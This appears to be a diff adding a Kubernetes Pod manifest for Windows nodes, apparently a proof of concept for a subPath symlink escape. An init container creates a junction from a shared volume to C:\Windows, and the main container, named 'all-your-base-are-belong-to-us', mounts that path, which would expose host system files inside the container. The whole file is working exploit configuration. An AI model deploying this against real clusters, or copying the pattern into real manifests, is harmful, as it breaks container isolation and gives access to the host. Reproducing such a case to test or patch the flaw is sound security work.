@@ -1,0 +1,27 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: secbypass-win
+spec:
+  initContainers:
+  - name: prep-symlink
+    image: microsoft/windowsservercore:1709
+    command:
+    - cmd.exe
+    - /c
+    - mklink /J c:\tmp\abc c:\windows
+    volumeMounts:
+    - name: volume01
+      mountPath: /tmp
+  containers:
+  - name: all-your-base-are-belong-to-us
+    image: microsoft/aspnet:4.7.1-windowsservercore-1709
+    volumeMounts:
+    - name: volume01
+      subPath: abc
+      mountPath: /test
+  volumes:
+  - name: volume01
+    emptyDir: {}
+  nodeSelector:
+    beta.kubernetes.io/os: windows 
